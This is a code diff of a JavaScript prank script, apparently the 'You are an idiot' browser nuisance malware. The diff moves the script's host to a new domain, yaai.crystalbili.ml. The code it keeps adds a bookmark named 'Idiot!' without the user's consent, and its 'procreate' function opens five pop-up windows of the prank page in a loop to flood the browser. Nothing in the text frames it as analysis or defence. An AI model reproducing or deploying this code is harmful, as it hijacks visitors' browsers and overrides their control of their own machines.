@@ -2,7 +2,7 @@ function bookmark() {
 		if ((navigator.appName == "Microsoft Internet Explorer") 
 		&& (parseInt(navigator.appVersion) >= 4)) 
 		{
-		var url="http://youareanidiot.crystalbili.xyz/scripts/lol.html";
+		var url="http://yaai.crystalbili.ml/scripts/lol.html";
 		var title="Idiot!";
 		window.external.AddFavorite(url,title);
 		}
@@ -25,7 +25,7 @@ function openWindow(url) {
 function procreate() {
 	changeTitle("Idiot!");
 	for (var i = 0; i < 5; i++) {
-		openWindow('http://youareanidiot.crystalbili.xyz/scripts/lol.html');
+		openWindow('http://yaai.crystalbili.ml/scripts/lol.html');
 	}
 }
 
